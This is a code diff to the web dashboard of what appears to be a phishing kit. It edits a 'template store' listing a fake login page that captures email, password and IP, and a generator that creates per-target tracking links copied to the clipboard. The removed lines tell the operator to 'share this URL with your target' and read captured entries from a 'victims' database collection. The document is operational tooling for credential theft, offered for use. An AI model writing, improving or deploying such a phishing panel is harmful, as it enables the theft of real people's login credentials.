@@ -619,7 +619,7 @@
       class="search-bar"
       id="siteSearch"
       placeholder="SEARCH TEMPLATES..."
-      oninput="renderSites()"
+      oninput="window.renderSites()"
     />
   </div>
 
@@ -1327,272 +1327,121 @@ function friendlyErr(code){
 const saved = localStorage.getItem('theme');
 if(saved && saved!=='dark') { document.documentElement.setAttribute('data-theme',saved); }
 </script>
-<script type="module">
-  // ================== TEMPLATE STORE ==================
+
+<script>
+// ================== TEMPLATE STORE ==================
 // Available phishing pages from the 'sites/' folder
 const siteTemplates = [
   {
     file: "login.html",
     name: "Login Page",
     desc: "Fake login form that captures email & password credentials with IP tracking.",
+    link: "sites/login.html",
     image: "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=1200",
     tags: ["login","credential","capture"],
   }
 ];
 
-window.renderSites = () => {
-  const grid = document.getElementById('sitesGrid');
-  const search = document.getElementById('siteSearch').value.toLowerCase();
+window.renderSites = function() {
+  try {
+    const grid = document.getElementById('sitesGrid');
+    const search = document.getElementById('siteSearch').value.toLowerCase();
 
-  const filtered = siteTemplates.filter(site =>
-    (site.name + site.desc + site.tags.join(' ')).toLowerCase().includes(search)
-  );
+    const filtered = siteTemplates.filter(site =>
+      (site.name + site.desc + site.tags.join(' ')).toLowerCase().includes(search)
+    );
 
-  grid.innerHTML = filtered.map((site, index) => `
-    <div class="site-card">
-      <img class="site-preview" src="${site.image}" />
-      <div class="site-content">
-        <div class="site-title">${site.name}</div>
-        <div class="site-desc">${site.desc}</div>
-        <div class="site-tags">
-          ${site.tags.map(t => `<div class="site-tag">${t}</div>`).join('')}
+    grid.innerHTML = filtered.map((site, index) => `
+      <div class="site-card">
+        <img class="site-preview" src="${site.image}" />
+        <div class="site-content">
+          <div class="site-title">${site.name}</div>
+          <div class="site-desc">${site.desc}</div>
+          <div class="site-tags">
+            ${site.tags.map(t => `<div class="site-tag">${t}</div>`).join('')}
+          </div>
+          <button class="site-btn" onclick="window.generateTunnelForSite(${index})">
+            GET LINK
+          </button>
         </div>
-        <button class="site-btn" onclick="generateTunnelForSite(${index})">
-          GET LINK
-        </button>
       </div>
-    </div>
-  `).join('');
+    `).join('');
+    
+    console.log('Sites rendered successfully');
+  } catch(e) {
+    console.error('renderSites error:', e);
+  }
 };
-
-// ================== TUNNEL MANAGEMENT ==================
 
 // Generate unique tunnel ID
 function generateTunnelId() {
   return 't_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
 }
 
-// Create tunnel command
-function createTunnelCommand(name) {
-  const tunnelId = generateTunnelId();
-  const tunnelName = name || `tunnel_${tunnels.length + 1}`;
-  const expiry = new Date(Date.now() + 30 * 60 * 1000); // 30 minutes from now
-  
-  const tunnel = {
-    id: tunnelId,
-    name: tunnelName,
-    url: `${LOGIN_BASE_URL}?tunnel=${tunnelId}`,
-    createdAt: new Date(),
-    expiresAt: expiry,
-    active: true,
-    owner: currentUser?.email || 'anonymous'
-  };
-  
-  tunnels.push(tunnel);
-  
-  return [
-    `  TUNNEL CREATED SUCCESSFULLY`,
-    `  ─────────────────────────────`,
-    `  ID:     ${tunnelId}`,
-    `  Name:   ${tunnelName}`,
-    `  URL:    ${tunnel.url}`,
-    `  Expires: ${expiry.toLocaleString()}`,
-    `  Owner:  ${tunnel.owner}`,
-    `  ─────────────────────────────`,
-    `  Share this URL with your target.`,
-    `  Data will be captured for 30 minutes.`,
-    `  Use 'tunnel filter ${tunnelId}' to view captured data.`,
-  ];
-}
-
-// List tunnels command
-function listTunnelsCommand() {
-  if (tunnels.length === 0) {
-    return ['  NO ACTIVE TUNNELS'];
-  }
-  
-  const now = new Date();
-  const lines = ['  ACTIVE TUNNELS:'];
-  
-  tunnels.forEach((t, i) => {
-    const expired = now > t.expiresAt;
-    const status = expired ? 'EXPIRED' : 'ACTIVE';
-    const timeLeft = expired ? '—' : Math.round((t.expiresAt - now) / 60000) + ' min';
-    
-    lines.push(`  ${i + 1}. [${t.id.slice(0, 8)}] ${t.name}`);
-    lines.push(`     Status: ${status} | Expires: ${timeLeft}`);
-    lines.push(`     URL: ${t.url}`);
-  });
-  
-  return lines;
-}
-
-// Close tunnel command
-function closeTunnelCommand(id) {
-  const idx = tunnels.findIndex(t => t.id === id || t.id.startsWith(id));
-  if (idx === -1) {
-    return [`  ERROR: Tunnel '${id}' not found`];
-  }
-  
-  tunnels[idx].active = false;
-  tunnels[idx].expiresAt = new Date(0); // Mark as expired
-  
-  return [
-    `  TUNNEL CLOSED: ${tunnels[idx].name}`,
-    `  No more data will be captured from this URL.`,
-    `  Use 'tunnel filter none' to view all victims.`,
-  ];
-}
-
-// Update victims loading to support filtering
-function loadVictims() {
-  const q = query(collection(db, 'victims'), orderBy('createdAt', 'desc'));
-  onSnapshot(q, snap => {
-    allVictims = snap.docs.map(d => ({id: d.id, ...d.data()}));
-    
-    if (activeTunnelFilter) {
-      victims = allVictims.filter(v => v.tunnelId === activeTunnelFilter);
-    } else {
-      victims = [...allVictims];
+// Generate tunnel for a specific site (global)
+window.generateTunnelForSite = function(siteIndex) {
+  try {
+    console.log('generateTunnelForSite called with index:', siteIndex);
+    const site = siteTemplates[siteIndex];
+    if (!site) {
+      console.error('Site not found at index:', siteIndex);
+      toast('ERROR: Site template not found', true);
+      return;
     }
     
-    renderVictims();
-    updateStats();
-  }, err => {
-    console.warn('Firestore:', err.message);
-  });
-}
-
-// Update renderSites to include tunnel generation
-window.renderSites = () => {
-  const grid = document.getElementById('sitesGrid');
-  const search = document.getElementById('siteSearch').value.toLowerCase();
-
-  const filtered = siteTemplates.filter(site =>
-    (site.name + site.desc + site.tags.join(' ')).toLowerCase().includes(search)
-  );
-
-  grid.innerHTML = filtered.map((site, index) => `
-    <div class="site-card">
-      <img class="site-preview" src="${site.image}" />
-      <div class="site-content">
-        <div class="site-title">${site.name}</div>
-        <div class="site-desc">${site.desc}</div>
-        <div class="site-tags">
-          ${site.tags.map(t => `<div class="site-tag">${t}</div>`).join('')}
-        </div>
-        <button class="site-btn" onclick="generateTunnelForSite(${index})">
-          GET LINK
-        </button>
-      </div>
-    </div>
-  `).join('');
-};
-
-// Generate tunnel for a specific site
-window.generateTunnelForSite = (siteIndex) => {
-  const site = siteTemplates[siteIndex];
-  const tunnelId = generateTunnelId();
-  const tunnelName = site.name.replace(/\s+/g, '_').toLowerCase();
-  const expiry = new Date(Date.now() + 30 * 60 * 1000);
-  
-  const tunnel = {
-    id: tunnelId,
-    name: tunnelName,
-    url: `${LOGIN_BASE_URL}?tunnel=${tunnelId}`,
-    createdAt: new Date(),
-    expiresAt: expiry,
-    active: true,
-    owner: currentUser?.email || 'anonymous',
-    template: site.name
-  };
-  
-  tunnels.push(tunnel);
-  
-  // Auto-copy URL to clipboard FIRST
-  navigator.clipboard.writeText(tunnel.url).then(() => {
-    toast('✅ LINK COPIED TO CLIPBOARD');
-  }).catch(() => {
-    // Fallback for older browsers
+    const tunnelId = generateTunnelId();
+    const tunnelName = site.name.replace(/\s+/g, '_').toLowerCase();
+    const expiry = new Date(Date.now() + 30 * 60 * 1000);
+    
+    const tunnelUrl = 'sites/' + site.file + '?tunnel=' + tunnelId;
+    
+    console.log('Tunnel created:', tunnelId);
+    console.log('URL:', tunnelUrl);
+    
+    // Store tunnel info
+    window.tunnels = window.tunnels || [];
+    window.tunnels.push({
+      id: tunnelId,
+      name: tunnelName,
+      url: tunnelUrl,
+      createdAt: new Date(),
+      expiresAt: expiry,
+      active: true,
+      template: site.name
+    });
+    
+    // Copy URL to clipboard
     const textarea = document.createElement('textarea');
-    textarea.value = tunnel.url;
+    textarea.value = tunnelUrl;
     document.body.appendChild(textarea);
     textarea.select();
     document.execCommand('copy');
     document.body.removeChild(textarea);
-    toast('✅ LINK COPIED TO CLIPBOARD');
-  });
-  
-  // Show tunnel modal AFTER notification
-  setTimeout(() => {
-    showTunnelModal(tunnel);
-  }, 800);
-};
-
-// Show tunnel modal
-function showTunnelModal(tunnel) {
-  const modal = document.getElementById('tunnelModal');
-  if (!modal) {
-    // Create modal if it doesn't exist
-    const modalHtml = `
-      <div class="modal-overlay" id="tunnelModal">
-        <div class="modal">
-          <div class="corner tl"></div><div class="corner tr"></div>
-          <div class="corner bl"></div><div class="corner br"></div>
-          <div class="modal-title" style="color:var(--accent);">⬡ TUNNEL GENERATED</div>
-          <div style="font-family:var(--mono);font-size:.8rem;color:var(--text);margin-bottom:16px;">
-            <div style="margin-bottom:12px;">
-              <span style="color:var(--text-dim);">Tunnel ID:</span><br/>
-              <span style="color:var(--accent2);">${tunnel.id}</span>
-            </div>
-            <div style="margin-bottom:12px;">
-              <span style="color:var(--text-dim);">URL (valid for 30 min):</span><br/>
-              <span style="color:var(--accent);" id="tunnelUrlText">${tunnel.url}</span>
-            </div>
-            <div style="margin-bottom:12px;">
-              <span style="color:var(--text-dim);">Template:</span><br/>
-              <span>${tunnel.template}</span>
-            </div>
-          </div>
-          <div class="modal-btns">
-            <button class="btn-sm info" onclick="copyTunnelUrl()">COPY URL</button>
-            <button class="btn-sm" onclick="closeModal('tunnelModal')">CLOSE</button>
-          </div>
-        </div>
-      </div>
-    `;
-    document.body.insertAdjacentHTML('beforeend', modalHtml);
-  } else {
-    // Update existing modal
-    document.getElementById('tunnelUrlText').textContent = tunnel.url;
+    
+    // Show notification
+    if (typeof toast === 'function') {
+      toast('✅ LINK COPIED TO CLIPBOARD');
+    } else {
+      alert('Link copied: ' + tunnelUrl);
+    }
+    
+  } catch(e) {
+    console.error('generateTunnelForSite error:', e);
+    if (typeof toast === 'function') {
+      toast('ERROR: ' + e.message, true);
+    } else {
+      alert('Error: ' + e.message);
+    }
   }
-  
-  openModal('tunnelModal');
-}
-
-// Copy tunnel URL to clipboard
-window.copyTunnelUrl = () => {
-  const url = document.getElementById('tunnelUrlText').textContent;
-  navigator.clipboard.writeText(url).then(() => {
-    toast('URL COPIED TO CLIPBOARD');
-    closeModal('tunnelModal');
-  }).catch(() => {
-    // Fallback
-    const textarea = document.createElement('textarea');
-    textarea.value = url;
-    document.body.appendChild(textarea);
-    textarea.select();
-    document.execCommand('copy');
-    document.body.removeChild(textarea);
-    toast('URL COPIED TO CLIPBOARD');
-    closeModal('tunnelModal');
-  });
 };
 
 // render when opening page
-setTimeout(() => {
+setTimeout(function() {
   if(document.getElementById('sitesGrid')){
-    renderSites();
+    window.renderSites();
+    console.log('Sites render triggered');
+  } else {
+    console.error('sitesGrid not found');
   }
 }, 1000);
 </script>
